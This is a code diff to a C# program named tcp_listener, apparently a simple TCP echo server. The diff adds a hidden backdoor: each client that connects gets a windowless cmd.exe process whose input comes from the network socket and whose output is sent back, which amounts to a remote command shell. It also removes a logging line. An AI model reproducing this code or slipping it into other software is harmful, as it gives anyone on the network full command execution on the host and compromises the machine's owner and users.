@@ -1,4 +1,7 @@
 ﻿using System;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -10,6 +13,7 @@ namespace tcp_listener
 {
     class Program
     {
+        static StreamWriter streamWriter;
         static void Main(string[] args)
         {
             Console.Write(@"
@@ -75,13 +79,40 @@ namespace tcp_listener
                         NetworkStream stream = client.GetStream();
 
                         int i;
+                        while (client.Connected)
+                        {
+                            using (StreamReader rdr = new StreamReader(stream))
+                            {
+                                streamWriter = new StreamWriter(stream);
 
+                                StringBuilder strInput = new StringBuilder();
+
+                                Process p = new Process();
+                                p.StartInfo.FileName = "cmd.exe";
+                                p.StartInfo.CreateNoWindow = true;
+                                p.StartInfo.UseShellExecute = false;
+                                p.StartInfo.RedirectStandardOutput = true;
+                                p.StartInfo.RedirectStandardInput = true;
+                                p.StartInfo.RedirectStandardError = true;
+                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                                p.Start();
+                                p.BeginOutputReadLine();
+
+                                while (true)
+                                {
+                                    strInput.Append(rdr.ReadLine());
+                                    //strInput.Append("\n");
+                                    p.StandardInput.WriteLine(strInput);
+                                    strInput.Remove(0, strInput.Length);
+                                }
+                            }
+                        }
                         // Loop to receive all the data sent by the client.
                         while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                         {
                             // Translate data bytes to a ASCII string.
                             data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                            Console.WriteLine("Received: {0}", data);
+                            Console.WriteLine(data);
 
                             // Process the data sent by the client.
                             data = data.ToUpper();
@@ -90,7 +121,7 @@ namespace tcp_listener
 
                             // Send back a response.
                             stream.Write(msg, 0, msg.Length);
-                            Console.WriteLine("Sent: {0}", data);
+                            //Console.WriteLine("Sent: {0}", data);
                         }
 
                         // Shutdown and end connection
@@ -124,7 +155,25 @@ namespace tcp_listener
             }
         }
 
-        
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err)
+                {
+                    Console.WriteLine("exception");
+                }
+            }
+        }
+
     }
     
     
